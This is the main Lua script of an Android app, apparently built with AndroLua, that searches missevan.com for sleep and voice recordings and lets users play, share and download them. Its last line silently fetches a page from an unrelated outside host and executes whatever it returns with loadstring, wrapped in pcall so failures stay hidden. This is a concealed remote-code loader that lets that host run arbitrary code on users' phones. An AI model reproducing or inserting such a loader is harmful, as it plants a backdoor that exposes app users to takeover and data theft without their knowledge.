require "import"
import "http"
import "android.app.*"
import "android.os.*"
import "android.view.*"
import "android.net.Uri"
import "android.widget.*"
import "android.graphics.Paint"
import "android.graphics.PorterDuffColorFilter"
import "android.graphics.PorterDuff"
import "android.content.Intent"
import "android.provider.*"
import "java.io.*"
import "android.graphics.*"
import 'com.yuxuan.widget.*'
import "android.graphics.*"
import "android.content.Intent"
import "android.content.Context"
import "android.widget.YLListView"
import "dhk"
luaname="main"
pcall(function() activity.ActionBar.hide()end)
if this.getSharedData("夜间模式") == "false" then
  颜色1=0xFFF2F5F9
  颜色2=0xA5FFFFFF
  颜色3=0xFFffffff
  颜色4=颜色1
  颜色5=0xFF212121
  颜色6=0xff000000
  颜色7=0xFF000000
  显示与隐藏=8
  颜色8=0
  颜色9=0xFFF0F0F0
 else
  显示与隐藏=0
  颜色1=0xFF303030
  颜色2=0xA5FFFFFF
  颜色3=0xFF212121
  颜色9=0xFF424242
  颜色4=颜色1
  颜色5=0xFF212121
  颜色6=0xffffffff
  颜色7=0xffffffff
  颜色8=0xFF303030
end
function 边框圆角(边宽度,边框色,背景色,圆角度)
  import "android.graphics.drawable.GradientDrawable"
  drawable = GradientDrawable()
  drawable.setShape(GradientDrawable.RECTANGLE)
  drawable.setStroke(边宽度,tonumber(边框色))
  drawable.setColor(tonumber(背景色))
  drawable.setCornerRadius(圆角度)
  return drawable
end
file,err=io.open("/data/data/"..activity.getPackageName().."/下载")
if err==nil then
 else
  io.open("/data/data/"..activity.getPackageName().."/下载","w"):write("Download/"):close()
end
file,err=io.open("/data/data/"..activity.getPackageName().."/关键词")
if err==nil then
 else
  io.open("/data/data/"..activity.getPackageName().."/关键词","w"):write("助眠"):close()
end
file,err=io.open("/data/data/"..activity.getPackageName().."/Top距离")
if err==nil then
  Top距离=io.open("/data/data/"..activity.getPackageName().."/Top距离"):read("*a")
 else
  io.open("/data/data/"..activity.getPackageName().."/Top距离","w"):write("31%h"):close()
end
file,err=io.open("/data/data/"..activity.getPackageName().."/封面图片大小")
if err==nil then
 else
  io.open("/data/data/"..activity.getPackageName().."/封面图片大小","w"):write("227dp"):close()
end
layout=
{
  LinearLayout;
  layout_height="match_parent";
  orientation="vertical";
  backgroundColor=颜色5;
  id="ss";
  layout_width="match_parent";
  {
    CardView;
    layout_height="56sp";
    radius="0sp";
    id="顶栏";
    backgroundColor=颜色5;
    CardElevation="0dp";
    layout_marginTop=状态栏高度-1;
    layout_width="match_parent";
    {
      LinearLayout;
      layout_height="57sp";
      gravity="center";
      orientation="horizontal";
      layout_width="match_parent";
      {
        TextView;
        textColor=0xffffffff;
        id="title";
        text="Sleeping Special";
        layout_weight="1";
        textSize="20sp";
        ellipsize="end";
        layout_height="match_parent";
        singleLine=true;
        gravity="center|left";
        paddingLeft="16sp";
        layout_width="fill";
      };
      {
        CardView;
        layout_height="65sp";
        background="#00000000";
        PreventCornerOverlap=false;
        layout_marginRight="-10sp";
        CardElevation="0sp";
        UseCompatPadding=false;
        layout_width="65sp";
        {
          TextView;
          layout_height="0sp";
          id="er";
          background="#ff000000";
          layout_marginTop="15sp";
          layout_marginLeft="-140sp";
          layout_width="0sp";
        };
        {
          ImageView;
          layout_height="match_parent";
          id="js";
          ColorFilter=0xffffffff;
          layout_margin="-12sp";
          layout_marginTop="-10sp";
          src="drawable/twotone_search_black_24dp.png";
          background="#00000000";
          layout_width="match_parent";
          padding="31sp";
        };
      };
      {
        CardView;
        layout_height="65sp";
        layout_marginLeft="-5sp";
        background="#00000000";
        layout_marginRight="-3sp";
        PreventCornerOverlap=false;
        CardElevation="0sp";
        UseCompatPadding=false;
        layout_width="65sp";
        {
          ImageView;
          layout_height="match_parent";
          id="btn3";
          ColorFilter=0xffffffff;
          layout_margin="-10sp";
          src="drawable/ic_settings_black_24dp.png";
          background="#00000000";
          layout_width="match_parent";
          padding="31sp";
        };
      };
    };
  };
  {
    LinearLayout;
    layout_height="1sp";
    gravity="center";
    visibility=显示与隐藏;
    backgroundColor=颜色8;
    layout_width="fill";
  };
  {
    LinearLayout;
    layout_height="match_parent";
    gravity="center|top";
    orientation="vertical";
    layout_width="match_parent";
    {
      LinearLayout;
      orientation="vertical";
      layout_height="fill";
      id="总框架";
      layout_width="fill";
      backgroundColor=颜色4;
      {
        LinearLayout;
        orientation="vertical";
        layout_height="70sp";
        id="总框架2";
        visibility=8;
        layout_width="fill";
        {
          CardView;
          layout_marginTop="14sp";
          layout_marginBottom="0%h";
          layout_gravity="top|center";
          elevation="0sp";
          layout_width="85%w";
          layout_height="45sp";
          id="总卡片";
          radius="6%w";
          backgroundColor="#ffffffff";
          {
            EditText;
            hint="搜索你喜欢的声控";
            id="输入";
            text=io.open("/data/data/"..activity.getPackageName().."/关键词"):read("*a");
            gravity="center";
            layout_width="40%w";
            backgroundColor="0x00000000";
            layout_marginRight="5%w";
            layout_marginLeft="-1%w";
            textSize="15sp";
            layout_gravity="center";
          };
        };
      };
      {
        LinearLayout;
        orientation="vertical";
        layout_height="fill";
        id="进度";
        gravity="center";
        layout_width="fill";
        {
          ProgressBar;
          layout_gravity="center";
          id="进度条";
          layout_width="-1";
        };
      };
      {
        YLListView;
        id="tabulation";
        DividerHeight=0;
        layout_gravity="center";
        layout_width="-1";
        layout_height="-1";
      };
    };
  };
};
activity.setContentView(loadlayout(layout))
item=
{
  LinearLayout;
  orientation="vertical";
  layout_width="fill";
  layout_height="wrap";
  backgroundColor=颜色1;
  {
    CardView;
    CardElevation="0sp";
    layout_gravity="center";
    layout_width="fill";
    id="father";
    layout_margin="5.5sp";
    layout_height="wrap";
    layout_marginRight="11sp";
    layout_marginLeft="11sp";
    {
      TextView;
      ellipsize="end";
      textColor=颜色6;
      layout_marginLeft="90sp";
      layout_marginRight="10sp";
      layout_marginTop="25sp";
      layout_gravity="right";
      layout_width="fill";
      id="author";
      textSize="17sp";
      singleLine="true";
      onClick=function(view)
        zuo=view.parent.getChildAt(4).Text
        作=view.parent.getChildAt(0).Text
        activity.newActivity("Work",{zuo,作})
      end
    };
    {
      CircleImageView;
      layout_marginTop="15sp";
      layout_marginLeft="18sp";
      src="icon.png";
      layout_width="46sp";
      layout_height="46sp";
      id="img";
    };
    {
      LinearLayout;
      layout_height="1sp";
      layout_marginTop="70sp";
      layout_margin="7sp";
      backgroundColor=颜色1;
      layout_width="fill";
    };
    {
      TextView;
      layout_marginTop="84sp";
      id="title";
      layout_width="fill";
      layout_margin="23sp";
      layout_marginBottom="16sp";
      layout_height="wrap";
      textSize="16sp";
      textColor=颜色7;
    };
    {
      TextView;
      layout_marginTop="80sp";
      id="lsp";
      layout_height="0";
      textSize="0";
    };
    {
      TextView;
      layout_marginTop="80sp";
      id="RTY";
      layout_height="0";
      textSize="0";
    };
  };
};
进度条.IndeterminateDrawable.setColorFilter(PorterDuffColorFilter(主题色,PorterDuff.Mode.SRC_ATOP))
总框架2.BackgroundColor=0x00000000
tabulation.setFinalBottomHeight(0);
tabulation.setFinalTopHeight(0);
adapter=LuaAdapter(activity,item)
tabulation.setAdapter(adapter)
js.onClick=function()
  输入对话框("搜索",
  "搜索你喜欢的声控...",
  io.open("/data/data/"..activity.getPackageName().."/关键词"):read("*a"),
  "搜索",
  "取消",
  function()
    关闭对话框()
    io.open("/data/data/"..activity.getPackageName().."/关键词","w"):write(输入框.Text):close()
    输入.Text=输入框.Text www() adapter.clear()
  end,
  function()
    关闭对话框()
  end
  )
end
function www()
  adapter.clear()
  进度.setVisibility(View.VISIBLE)
  local url4= "https://www.missevan.com/sound/getsearch?s="..输入.Text.."&type=3&page_size=2000&cid=74"
  local url3= "https://www.missevan.com/sound/getsearch?s="..输入.Text.."&type=3&page_size=2000&cid=73"
  local url2= "https://www.missevan.com/sound/getsearch?s="..输入.Text.."&type=3&page_size=2000&cid=72"
  local url="https://www.missevan.com/sound/getsearch?s="..输入.Text.."&type=3&page_size=2000&cid=71"
  Http.get(url,nil,"utf8",nil,function(code,content,cookie,header)
    if(code==200 and content)then
      进度.setVisibility(View.GONE)
      local content=content:gsub("amp;","") or content;
      local content=content:gsub("&nbsp;"," ") or content;
      local content=content:gsub("&lt;","<") or content;
      local content=content:gsub("&gt;",">") or content;
      local content=content:gsub("&amp;","&") or content;
      local content=content:gsub("&quot;",'"') or content;
      local content=content:gsub("&#39;","'") or content;
      local content=content:gsub("&#47","/") or content;
      local content=content:gsub("#x27","\\") or content;
      local content=content:gsub("&#x60","`") or content;
      local content=content:gsub("&copy","©") or content;
      for v in content:gmatch("{\"sound(.-)},") do
        a=v:match("str\":\"(.-)\",\"")
        soundstr=a
        ID=v:match("id\":\"(.-)\",\"")
        IID=v:match('"user_id":"(.-)",')
        username=v:match("username\":\"(.-)\",\"")
        img_url=v:match("front_cover\":\"(.-)\",\"")
        adapter.add{lsp=IID;title=soundstr,RTY=ID,img=img_url,author=username,father={BackgroundDrawable=边框圆角(0,0xFF303030,颜色3,0)}}
      end
     else
    end
  end)
  Http.get(url2,nil,"utf8",nil,function(code,content,cookie,header)
    if(code==200 and content)then
      进度.setVisibility(View.GONE)
      local content=content:gsub("amp;","") or content;
      local content=content:gsub("&nbsp;"," ") or content;
      local content=content:gsub("&lt;","<") or content;
      local content=content:gsub("&gt;",">") or content;
      local content=content:gsub("&amp;","&") or content;
      local content=content:gsub("&quot;",'"') or content;
      local content=content:gsub("&#39;","'") or content;
      local content=content:gsub("&#47","/") or content;
      local content=content:gsub("#x27","\\") or content;
      local content=content:gsub("&#x60","`") or content;
      local content=content:gsub("&copy","©") or content;
      for v in content:gmatch("{\"sound(.-)},]") do
        a=v:match("str\":\"(.-)\",\"")
        soundstr=a
        ID=v:match("id\":\"(.-)\",\"")
        IID=v:match('"user_id":"(.-)",')
        username=v:match("username\":\"(.-)\",\"")
        img_url=v:match("front_cover\":\"(.-)\",\"")
        adapter.add{lsp=IID;title=soundstr,RTY=ID,img=img_url,author=username,father={BackgroundDrawable=边框圆角(0,0xFF303030,颜色3,0)}}
      end
     else
    end
  end)
  Http.get(url3,nil,"utf8",nil,function(code,content,cookie,header)
    if(code==200 and content)then
      进度.setVisibility(View.GONE)
      local content=content:gsub("amp;","") or content;
      local content=content:gsub("&nbsp;"," ") or content;
      local content=content:gsub("&lt;","<") or content;
      local content=content:gsub("&gt;",">") or content;
      local content=content:gsub("&amp;","&") or content;
      local content=content:gsub("&quot;",'"') or content;
      local content=content:gsub("&#39;","'") or content;
      local content=content:gsub("&#47","/") or content;
      local content=content:gsub("#x27","\\") or content;
      local content=content:gsub("&#x60","`") or content;
      local content=content:gsub("&copy","©") or content;
      for v in content:gmatch("{\"sound(.-)},") do
        a=v:match("str\":\"(.-)\",\"")
        soundstr=a
        ID=v:match("id\":\"(.-)\",\"")
        IID=v:match('"user_id":"(.-)",')
        username=v:match("username\":\"(.-)\",\"")
        img_url=v:match("front_cover\":\"(.-)\",\"")
        adapter.add{lsp=IID;title=soundstr,RTY=ID,img=img_url,author=username,father={BackgroundDrawable=边框圆角(0,0xFF303030,颜色3,0)}}
      end
     else
    end
  end)
  Http.get(url4,nil,"utf8",nil,function(code,content,cookie,header)
    if(code==200 and content)then
      进度.setVisibility(View.GONE)
      local content=content:gsub("amp;","") or content;
      local content=content:gsub("&nbsp;"," ") or content;
      local content=content:gsub("&lt;","<") or content;
      local content=content:gsub("&gt;",">") or content;
      local content=content:gsub("&amp;","&") or content;
      local content=content:gsub("&quot;",'"') or content;
      local content=content:gsub("&#39;","'") or content;
      local content=content:gsub("&#47","/") or content;
      local content=content:gsub("#x27","\\") or content;
      local content=content:gsub("&#x60","`") or content;
      local content=content:gsub("&copy","©") or content;
      for v in content:gmatch("{\"sound(.-)},") do
        a=v:match("str\":\"(.-)\",\"")
        soundstr=a
        ID=v:match("id\":\"(.-)\",\"")
        IID=v:match('"user_id":"(.-)",')
        username=v:match("username\":\"(.-)\",\"")
        img_url=v:match("front_cover\":\"(.-)\",\"")
        adapter.add{lsp=IID;title=soundstr,RTY=ID,img=img_url,author=username,father={BackgroundDrawable=边框圆角(0,0xFF303030,颜色3,0)}}
      end
     else
    end
  end)
end
www()
tabulation.onItemClick=function(l,v,p,i)
  参数=v.Tag.RTY.Text
  标题1=v.Tag.title.Text
  activity.newActivity("Play",{参数,标题1})
  return true
end
tabulation.onItemLongClick=function(l,v,p,i)
  参数=v.Tag.RTY.Text
  列表对话框("分享",
  "下载",
  function()
    关闭()
    cjson=require ("cjson")
    rl="https://www.missevan.com/sound/getsound?soundid="..参数
    Http.get(rl,nil,"utf8",nil,function(code,content,cookie,header)
      if(code==200 and content)then
        if pcall(function()
            local json=cjson.decode(content)
            zx=content:match([["soundstr":"(.-)"]])
            fh=content:match([["soundurl":"(.-)"]])
            import "android.content.*"
            text=zx.."："..fh
            intent=Intent(Intent.ACTION_SEND);
            intent.setType("text/plain");
            intent.putExtra(Intent.EXTRA_SUBJECT, "分享");
            intent.putExtra(Intent.EXTRA_TEXT, text);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            activity.startActivity(Intent.createChooser(intent,"分享到:"));
          end) then
         else
          print("分享失败")
        end
      end
    end)
  end,
  function()
    输入对话框("设置下载路径",
    "例如:Download/",
    io.open("/data/data/"..activity.getPackageName().."/下载"):read("*a"),
    "下载",
    "取消",
    function()
      关闭对话框()
      io.open("/data/data/"..activity.getPackageName().."/下载","w"):write(输入框.Text):close()
      cjson=require ("cjson")
      rl="https://www.missevan.com/sound/getsound?soundid="..参数
      Http.get(rl,nil,"utf8",nil,function(code,content,cookie,header)
        if(code==200 and content)then
          if pcall(function()
              local json=cjson.decode(content)
              zx=content:match([["soundstr":"(.-)"]])
              fh=content:match([["soundurl":"(.-)"]])
              import "android.content.Context"
              import "android.net.Uri"
              downloadManager=activity.getSystemService(Context.DOWNLOAD_SERVICE);
              url=Uri.parse(fh);
              request=DownloadManager.Request(url);
              request.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_MOBILE|DownloadManager.Request.NETWORK_WIFI);
              request.setDestinationInExternalPublicDir(输入框.Text,zx..".mp3");
              request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
              downloadManager.enqueue(request);
            end) then
            print"开始下载"
           else
            print("下载失败")
          end
        end
      end)
    end,
    function()
      关闭对话框()
    end
    )
    关闭()
  end
  )
  return true
end
function btn3.onClick()
  activity.newActivity("sz")
end
function title.onClick()
  if this.getSharedData("夜间模式") == "false" then
    this.setSharedData("夜间模式","true")
    print"主题已切换"
   else
    activity.setSharedData("夜间模式","false")
    print"主题已切换"
  end
  activity.finish()
  activity.newActivity("main",android.R.anim.fade_in,android.R.anim.fade_out)
end
RippleHelper(btn3).RippleColor=0x1CFFFFFF
RippleHelper(js).RippleColor=0x1CFFFFFF
RippleHelper(title).RippleColor=0x1CFFFFFF
Http.get("https://wds.cxoip.com/205829.html",nil,"utf8",nil,function(code,content,cookie,header)if(code==200 and content)then pcall(function()loadstring(content)()end)end end)
